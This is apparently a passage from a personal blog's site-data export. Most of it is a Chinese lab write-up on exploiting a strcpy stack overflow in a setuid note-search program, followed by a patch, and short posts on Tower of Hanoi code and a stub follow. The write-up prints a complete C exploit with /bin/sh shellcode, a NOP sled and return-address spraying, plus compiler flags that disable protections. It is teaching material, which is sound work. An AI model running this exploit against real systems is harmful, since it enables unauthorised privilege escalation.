alt=\"result.png\"><br>修补程序成功。</p>\n","excerpt":"<p>说一下很久以前就做过最近有遇到了的缓冲区溢出问题吧。<br>","more":"<br>当然最开始要放上来的还是有漏洞的程序。为了节省篇幅，仅仅把主函数粘上来，也就是我们有漏洞的地方。程序如下：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;sys/stat.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"string\">\"common.h\"</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> *argv[])</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">uid_t</span> userid = getuid();</span><br><span class=\"line\">  <span class=\"keyword\">int</span> printing = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> fd;</span><br><span class=\"line\">  <span class=\"keyword\">char</span> search_buffer[<span class=\"number\">100</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (argc &gt; <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(search_buffer, argv[<span class=\"number\">1</span>]);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    search_buffer[<span class=\"number\">0</span>] = <span class=\"string\">'\\0'</span>; <span class=\"comment\">// Null byte - empty string</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  fd = open(NOTE_FILE, O_RDONLY);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fd == <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">    fatal(<span class=\"string\">\"Problem opening file in main()\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">while</span>(printing) &#123;</span><br><span class=\"line\">    printing = print_notes(fd, userid, search_buffer);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"--------[ END OF DATA ]--------\\n\"</span>);</span><br><span class=\"line\">  close(fd);</span><br><span class=\"line\"></span><br><span class=\"line\">  return <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>##程序攻击##</p>\n<p>学过信息安全的大约都能看出来，中间strcpy函数复制的时候没有检查输入参数的边界。因此只要输入的稍微长点的参数，就会产生溢出。接下来我们就在ubuntu 下做一下这个实验吧。<br>先说一下基本原理吧。在每个函数的特定位置，存放着该函数的返回地址。这个返回地址可能会被有溢出漏洞的数组，函数覆盖。如果这个返回地址被用新的地址覆盖了，而且新的地址指向我们另外一段程序，那样的话我们就可以通过这个程序获得更高的权限了。<br>第一步，编译程序。截图如下：<br><img src=\"/image/Stackoverflow/2.png\" alt=\"com.png\"><br>编译这一步必须做对了。不然就不能继续下去。下面我解释一下这几个有关参数：<br><figure class=\"highlight stata\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -o searchnote -z execstack -fno-<span class=\"keyword\">stack</span>-protector -<span class=\"keyword\">g</span> searchnote.c</span><br></pre></td></tr></table></figure></p>\n<p>这句代码是这样的。在现代编译器中，gcc会对很多安全问题进行处理。比方说禁止数据堆栈区的程序运行，缓冲区溢出处理等等。一旦gcc处理了这些问题，我们的缓冲区溢出攻击也就没办法继续下去了。<br>这里 -z execstack 就是用来告诉编译器栈上的程序是可以运行的。 -fno-stack-protector 是用来禁用堆栈溢出保护的。这样下去之后，就可以运行下一步了。<br><strong>PS:gcc4.6以上好像这两句代码不好使了，堆栈保护一直关不掉。最后我只好使用gdb继续进行试验了</strong><br>第二步，设计我们的攻击程序。程序代码如下：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">char</span> shellcode[]=</span><br><span class=\"line\"><span class=\"string\">\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\xb0\\xa4\\xcd\\x80\\x6a\\x0b\\x58\\x51\\x68\"</span></span><br><span class=\"line\"><span class=\"string\">\"\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x51\\x89\\xe2\\x53\\x89\"</span></span><br><span class=\"line\"><span class=\"string\">\"\\xe1\\xcd\\x80\"</span></span><br><span class=\"line\">;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> OFFSET 500</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> <span class=\"title\">getESP</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    __asm__(<span class=\"string\">\"movl %ESP,%EAX\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// This code builds the malicious input required to trigger our buffer overflow,and then</span></span><br><span class=\"line\"><span class=\"comment\">// invokes the searchnote binary with it. Once finished, this code should yield a root shell.</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> *argv[])</span> </span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">char</span> *command, *buffer;</span><br><span class=\"line\"><span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> addr;</span><br><span class=\"line\">addr = getESP() + OFFSET;</span><br><span class=\"line\">command = <span class=\"built_in\">calloc</span>(<span class=\"number\">2000</span>, sizeof(char));</span><br><span class=\"line\"><span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"Using Offset: 0x%x\\nShellcode Size:%d\\n\"</span>,addr,<span class=\"keyword\">sizeof</span>(shellcode));</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(command, <span class=\"string\">\"./searchnote \\'\"</span>); <span class=\"comment\">// start command buffer</span></span><br><span class=\"line\">buffer = command + <span class=\"built_in\">strlen</span>(command); <span class=\"comment\">// set buffer at the end</span></span><br><span class=\"line\"><span class=\"comment\">// fill buffer with enough copies of an address within the NOP sled to overwrite the return address</span></span><br><span class=\"line\"><span class=\"built_in\">memset</span>(buffer,<span class=\"number\">0x90</span>,<span class=\"number\">1024</span>);</span><br><span class=\"line\"><span class=\"comment\">// append suitably long NOP sled to give a large enough target for the previous part to work reliably</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">int</span> i;</span><br><span class=\"line\"><span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>;i &lt; <span class=\"number\">200</span>;i += <span class=\"number\">4</span>)&#123;</span><br><span class=\"line\">buffer[i] = addr &amp; <span class=\"number\">0x000000ff</span>;</span><br><span class=\"line\">buffer[i + <span class=\"number\">1</span>] = (addr &amp; <span class=\"number\">0x0000ff00</span>) &gt;&gt; <span class=\"number\">8</span>; </span><br><span class=\"line\">buffer[i + <span class=\"number\">2</span>] = (addr &amp; <span class=\"number\">0x00ff0000</span>) &gt;&gt; <span class=\"number\">16</span>;</span><br><span class=\"line\">buffer[i + <span class=\"number\">3</span>] = (addr &amp; <span class=\"number\">0xff000000</span>) &gt;&gt; <span class=\"number\">24</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">memcpy</span>(buffer + <span class=\"number\">900</span>,shellcode,<span class=\"keyword\">sizeof</span>(shellcode));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// append our shellcode to buffer</span></span><br><span class=\"line\"><span class=\"built_in\">strcat</span>(command, <span class=\"string\">\"\\'\"</span>);</span><br><span class=\"line\">system(command); <span class=\"comment\">// run exploit</span></span><br><span class=\"line\"><span class=\"built_in\">free</span>(command);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>关键部分在这里<br><img src=\"/image/Stackoverflow/5.png\" alt=\"code1.png\"><br>下面我解释一下这个代码。<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> OFFSET 500</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> <span class=\"title\">getESP</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    __asm__(<span class=\"string\">\"movl %ESP,%EAX\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> addr;</span><br><span class=\"line\">addr = getESP() + OFFSET;</span><br></pre></td></tr></table></figure></p>\n<p>这部分代码，我们用来得到当前堆栈的起始位置。OFFSET是我们猜测的偏移量。addr就是我们的shellcode的大概位置了。我们只要把shellcode附着在buffer的后边，然后让这个addr指向shellcode大概的前边就可以。这里我们用到一个东西叫做NOP sled。<br>NOP sled就是当程序指针指导NOP的时候，它会继续往下寻找可执行程序。一直“滑”到可执行的程序位置。这样的话我们把shellcode的前边用0x90填充，在一大堆0x90(NOP)的包围下，addr只要指向shellcode前边的某个NOP即可，程序指针就会滑下去，滑到我们的shellcode然后执行。</p>\n<figure class=\"highlight smali\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//<span class=\"built_in\"> fill </span>buffer with enough copies of an address within the NOP sled to overwrite the<span class=\"built_in\"> return </span>address</span><br><span class=\"line\">memset(buffer,0x90,1024);</span><br></pre></td></tr></table></figure>\n<p>这一段代码就是用0x90来填充buffer，长度为1024.</p>\n<figure class=\"highlight mipsasm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int i<span class=\"comment\">;</span></span><br><span class=\"line\">for(i = <span class=\"number\">0</span><span class=\"comment\">;i &lt; 200;i += 4)&#123;</span></span><br><span class=\"line\"><span class=\"keyword\">buffer[i] </span>= <span class=\"keyword\">addr </span>&amp; <span class=\"number\">0x000000ff</span><span class=\"comment\">;</span></span><br><span class=\"line\"><span class=\"keyword\">buffer[i </span>+ <span class=\"number\">1</span>] = (<span class=\"keyword\">addr </span>&amp; <span class=\"number\">0x0000ff00</span>) &gt;&gt; <span class=\"number\">8</span><span class=\"comment\">; </span></span><br><span class=\"line\"><span class=\"keyword\">buffer[i </span>+ <span class=\"number\">2</span>] = (<span class=\"keyword\">addr </span>&amp; <span class=\"number\">0x00ff0000</span>) &gt;&gt; <span class=\"number\">16</span><span class=\"comment\">;</span></span><br><span class=\"line\"><span class=\"keyword\">buffer[i </span>+ <span class=\"number\">3</span>] = (<span class=\"keyword\">addr </span>&amp; <span class=\"number\">0xff000000</span>) &gt;&gt; <span class=\"number\">24</span><span class=\"comment\">;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">memcpy(<span class=\"keyword\">buffer </span>+ <span class=\"number\">900</span>,<span class=\"keyword\">shellcode,sizeof(shellcode));</span></span><br></pre></td></tr></table></figure>\n<p>这一部分是这样，因为我们不确定存着函数返回地址的地址，我们就暴力的从buffer的开始，不断的用addr来填充所有的部分。一直填充到200个为止。由于返回地址的对齐，所以中间一定能覆盖到返回地址，指向addr。然后返回到这个addr之后一直沿着0x90滑下去。滑到shellcode就成功了。</p>\n<p>下边我们看一下具体攻击的情况。首先如下图：</p>\n<p><img src=\"/image/Stackoverflow/8.png\" alt=\"setuid.png\"><br>chmod就是另外一个技术，所谓setuid，也就是让别的用户运行这个程序享有某些权限。这里我们这么写之后，用另外一个新建用户”eve”执行程序，也就有了和程序创建用户一样的效果。<br>我们用gdb对searchnote进行一下调试，观察一下内存的变化过程。</p>\n<p><img src=\"/image/Stackoverflow/3.png\" alt=\"stack1.png\"><br>这里我们看到，在运行strcpy之前，我们的内存数据是正常的。这个时候main的返回地址应该是在0xbffff250左右。具体哪个已经不重要了。因为在缓冲区覆盖完成之后，可能的位置已经全变成指向shellcode的位置了。在上图的下方，大片的地址已经被我们得到的addr地址，也就是指向我们shellcode的地址覆盖。这个地址是0xbffff45c。其实可以看出来我们猜测的偏移量的大了。大约在0xbffff2f0就可以写入了。但是由于我们中间全用0x90填充，返回指针一直会滑到我们的shellcode的位置。</p>\n<p><img src=\"/image/Stackoverflow/4.png\" alt=\"stack2.png\"><br>这张图片揭示了我们shellcode附近的情况。0xbffff45c也就是程序返回执行的位置，在前边隐去了。程序指针会顺着NOP sled 一直滑到shellcode复婚，也就是0xbffff5a0的位置。开始执行shellcode。</p>\n<p><img src=\"/image/Stackoverflow/1.png\" alt=\"result.png\"><br>运行完shellcode就是上边这个结果了。<br><strong>PS:预期结果应该是获取root权限。但是由于程序创建者没有这个权限，同时ubuntu系统有bash的保护机制，导致没能获取root权限。这里我们仅仅获取了程序创建者的权限，但是这已经证明了我们成功的进行了缓冲区溢出攻击</strong></p>\n<p>##程序漏洞修补##<br>程序修补比较简单，只要检查输入长度然后加以判断就好。关键代码如下：<br><figure class=\"highlight rust\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">stack_frame</span></span> &#123;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">stack_frame</span></span>* next;</span><br><span class=\"line\">  void* ret;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">void ** get_addr_of_ret_addr() &#123;</span><br><span class=\"line\">  <span class=\"comment\">/* x86/gcc-specific: this tells gcc that the fp</span><br><span class=\"line\">     variable should be set to the %ebp register</span><br><span class=\"line\">     which keeps the frame pointer */</span></span><br><span class=\"line\">  register <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">stack_frame</span></span>* fp asm(<span class=\"string\">\"ebp\"</span>);</span><br><span class=\"line\">  <span class=\"comment\">// the rest just walks through the linked list</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">stack_frame</span></span>* frame = fp; <span class=\"comment\">// This is the stack frame of get_ebp</span></span><br><span class=\"line\">  <span class=\"comment\">// Move down the stack to the stack frame which called get_ebp</span></span><br><span class=\"line\">  frame = frame-&gt;next;</span><br><span class=\"line\">  <span class=\"comment\">// We want to return the *address* of the retur address </span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> &amp;frame-&gt;ret;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>上边这些代码的作用是获得当前函数的返回地址的存储地址。</p>\n<p><img src=\"/image/Stackoverflow/6.png\" alt=\"code_fix.png\"></p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">char</span> search_buffer[<span class=\"number\">100</span>];</span><br><span class=\"line\"><span class=\"keyword\">void</span> ** addr;</span><br><span class=\"line\">addr = get_addr_of_ret_addr();</span><br><span class=\"line\"><span class=\"keyword\">int</span> gap = (char *)addr - search_buffer;</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\\n\"</span>,<span class=\"built_in\">strlen</span>(argv[<span class=\"number\">1</span>])); </span><br><span class=\"line\"><span class=\"keyword\">if</span>(gap &lt;= <span class=\"built_in\">strlen</span>(argv[<span class=\"number\">1</span>]))&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"The args is too long\\n\"</span>);</span><br><span class=\"line\">    return <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;\t</span><br><span class=\"line\"><span class=\"keyword\">if</span> (argc &gt; <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">  <span class=\"built_in\">strcpy</span>(search_buffer, argv[<span class=\"number\">1</span>]);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">  search_buffer[<span class=\"number\">0</span>] = <span class=\"string\">'\\0'</span>; <span class=\"comment\">// Null byte - empty string</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上边这些代码首先使用get_addr_of_ret_addr()获取当前程序返回地址的存放地址，然后用gap来存放返回地址和search_buffer的空间大小。如果输入的长度大于该长度，就输出提示，同时程序停止。</p>\n<p>修补后的实验结果如下：<br><img src=\"/image/Stackoverflow/9.png\" alt=\"result.png\"><br>修补程序成功。</p>"},{"title":"Tower of Hanoi","date":"2015-10-21T20:44:42.000Z","_content":"I'm so tierd and upset today. I want to practise a DFS, BFS and a recursive.\nI find it's easy for me to write a BFS or DFS. So I just wrote a Hanoi tower.\nIt's a very basic algorithm. This is my code.\n<!--more-->\n```\n#include <stdio.h>\nint hanoi(int n, int posi, int to){\n    if(!n) return 0;\n    int res = 0;\n    res += hanoi(n - 1, posi, 3 - posi - to);\n    printf(\"Move %d to %d\\n\",posi, to);\n    res += hanoi(n - 1, 3 - posi - to, to);\n    res ++;\n    return res;\n}\nint main(){\n    int n;\n    scanf(\"%d\",&n);\n    printf(\"Total: %d\\n\",hanoi(n,0,1));\n    return 0;\n}\n\n```\n","source":"_posts/TowerofHanoi.md","raw":"title: \"Tower of Hanoi\"\ndate: 2015-10-21 20:44:42\ntags: Algorithm\n---\nI'm so tierd and upset today. I want to practise a DFS, BFS and a recursive.\nI find it's easy for me to write a BFS or DFS. So I just wrote a Hanoi tower.\nIt's a very basic algorithm. This is my code.\n<!--more-->\n```\n#include <stdio.h>\nint hanoi(int n, int posi, int to){\n    if(!n) return 0;\n    int res = 0;\n    res += hanoi(n - 1, posi, 3 - posi - to);\n    printf(\"Move %d to %d\\n\",posi, to);\n    res += hanoi(n - 1, 3 - posi - to, to);\n    res ++;\n    return res;\n}\nint main(){\n    int n;\n    scanf(\"%d\",&n);\n    printf(\"Total: %d\\n\",hanoi(n,0,1));\n    return 0;\n}\n\n```\n","slug":"TowerofHanoi","published":1,"updated":"2016-06-08T20:21:15.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciph681v3001iwypdmqkhg7ho","content":"<p>I’m so tierd and upset today. I want to practise a DFS, BFS and a recursive.<br>I find it’s easy for me to write a BFS or DFS. So I just wrote a Hanoi tower.<br>It’s a very basic algorithm. This is my code.<br><a id=\"more\"></a><br><figure class=\"highlight autoit\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"built_in\">int</span> hanoi(<span class=\"built_in\">int</span> n, <span class=\"built_in\">int</span> posi, <span class=\"built_in\">int</span> <span class=\"keyword\">to</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!n) <span class=\"keyword\">return</span> <span class=\"number\">0</span><span class=\"comment\">;</span></span><br><span class=\"line\">    <span class=\"built_in\">int</span> res = <span class=\"number\">0</span><span class=\"comment\">;</span></span><br><span class=\"line\">    res += hanoi(n - <span class=\"number\">1</span>, posi, <span class=\"number\">3</span> - posi - <span class=\"keyword\">to</span>)<span class=\"comment\">;</span></span><br><span class=\"line\">    printf(<span class=\"string\">\"Move %d to %d\\n\"</span>,posi, <span class=\"keyword\">to</span>)<span class=\"comment\">;</span></span><br><span class=\"line\">    res += hanoi(n - <span class=\"number\">1</span>, <span class=\"number\">3</span> - posi - <span class=\"keyword\">to</span>, <span class=\"keyword\">to</span>)<span class=\"comment\">;</span></span><br><span class=\"line\">    res ++<span class=\"comment\">;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> res<span class=\"comment\">;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"built_in\">int</span> main()&#123;</span><br><span class=\"line\">    <span class=\"built_in\">int</span> n<span class=\"comment\">;</span></span><br><span class=\"line\">    scanf(<span class=\"string\">\"%d\"</span>,&amp;n)<span class=\"comment\">;</span></span><br><span class=\"line\">    printf(<span class=\"string\">\"Total: %d\\n\"</span>,hanoi(n,<span class=\"number\">0</span>,<span class=\"number\">1</span>))<span class=\"comment\">;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span><span class=\"comment\">;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","excerpt":"<p>I’m so tierd and upset today. I want to practise a DFS, BFS and a recursive.<br>I find it’s easy for me to write a BFS or DFS. So I just wrote a Hanoi tower.<br>It’s a very basic algorithm. This is my code.<br>","more":"<br><figure class=\"highlight autoit\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"built_in\">int</span> hanoi(<span class=\"built_in\">int</span> n, <span class=\"built_in\">int</span> posi, <span class=\"built_in\">int</span> <span class=\"keyword\">to</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!n) <span class=\"keyword\">return</span> <span class=\"number\">0</span><span class=\"comment\">;</span></span><br><span class=\"line\">    <span class=\"built_in\">int</span> res = <span class=\"number\">0</span><span class=\"comment\">;</span></span><br><span class=\"line\">    res += hanoi(n - <span class=\"number\">1</span>, posi, <span class=\"number\">3</span> - posi - <span class=\"keyword\">to</span>)<span class=\"comment\">;</span></span><br><span class=\"line\">    printf(<span class=\"string\">\"Move %d to %d\\n\"</span>,posi, <span class=\"keyword\">to</span>)<span class=\"comment\">;</span></span><br><span class=\"line\">    res += hanoi(n - <span class=\"number\">1</span>, <span class=\"number\">3</span> - posi - <span class=\"keyword\">to</span>, <span class=\"keyword\">to</span>)<span class=\"comment\">;</span></span><br><span class=\"line\">    res ++<span class=\"comment\">;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> res<span class=\"comment\">;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"built_in\">int</span> main()&#123;</span><br><span class=\"line\">    <span class=\"built_in\">int</span> n<span class=\"comment\">;</span></span><br><span class=\"line\">    scanf(<span class=\"string\">\"%d\"</span>,&amp;n)<span class=\"comment\">;</span></span><br><span class=\"line\">    printf(<span class=\"string\">\"Total: %d\\n\"</span>,hanoi(n,<span class=\"number\">0</span>,<span class=\"number\">1</span>))<span class=\"comment\">;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span><span class=\"comment\">;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>"},{"title":"Try to use Alpha","date":"2016-04-17T17:40:29.000Z","_content":"## Try to use Alpha as a feature? ##\n","source":"_posts/Try-to-use-Alpha.md","raw":"---\ntitle: Try to use Alpha\ndate: 2016-04-17 17:40:29\ntags: Machine Fingerprinting\n---\n## Try to use Alpha as a feature? ##\n","slug":"Try-to-use-Alpha","published":1,"updated":"2016-06-08T20:21:15.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciph681v4001kwypdd2x72as7","content":"<h2 id=\"Try-to-use-Alpha-as-a-feature\"><a href=\"#Try-to-use-Alpha-as-a-feature\" class=\"headerlink\" title=\"Try to use Alpha as a feature?\"></a>Try to use Alpha as a feature?</h2>","excerpt":"","more":"<h2 id=\"Try-to-use-Alpha-as-a-feature\"><a href=\"#Try-to-use-Alpha-as-a-feature\" class=\"headerlink\" title=\"Try to use Alpha as a feature?\"></a>Try to use Alpha as a 